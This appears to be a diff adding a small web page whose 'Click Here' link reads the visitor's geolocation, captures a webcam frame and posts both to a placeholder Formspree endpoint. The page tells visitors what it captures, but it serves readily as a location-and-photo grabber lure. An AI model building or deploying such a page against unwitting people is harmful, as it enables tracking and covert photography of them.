@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Location and Image</title>
+</head>
+<body>
+    <h1>Click the link to share your location and capture an image</h1>
+    <a href="#" onclick="getLocationAndCaptureImage()">Click Here</a>
+
+    <script>
+        function getLocationAndCaptureImage() {
+            // Get Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    console.log("Latitude: " + latitude + ", Longitude: " + longitude);
+
+                    // Capture Image
+                    captureImage()
+                        .then(imageData => {
+                            // Send location and image data to Formspree
+                            sendDataToFormspree(latitude, longitude, imageData);
+                        })
+                        .catch(err => console.error("Error capturing image: ", err));
+                }, function(error) {
+                    console.error("Error getting location: ", error);
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function captureImage() {
+            return new Promise((resolve, reject) => {
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+
+                        // Allow the video to play for a few seconds to capture the frame
+                        setTimeout(() => {
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/png'); // Convert image to base64
+                            
+                            // Stop video stream
+                            stream.getTracks().forEach(track => track.stop());
+
+                            resolve(imageData);
+                        }, 3000); // Capture after 3 seconds
+                    })
+                    .catch(err => {
+                        reject(err);
+                    });
+            });
+        }
+
+        function sendDataToFormspree(latitude, longitude, imageData) {
+            // Formspree URL (replace with your Formspree endpoint URL)
+            const formspreeUrl = 'https://formspree.io/f/{your_form_id}';
+
+            // Form data to send
+            const formData = new FormData();
+            formData.append('latitude', latitude);
+            formData.append('longitude', longitude);
+            formData.append('imageData', imageData);
+
+            // Send data to Formspree via POST
+            fetch(formspreeUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Form data sent successfully to Formspree');
+                    alert('Your data has been sent!');
+                } else {
+                    console.error('Error sending data to Formspree');
+                    alert('There was an error sending your data.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error sending your data.');
+            });
+        }
+    </script>
+</body>
+</html>
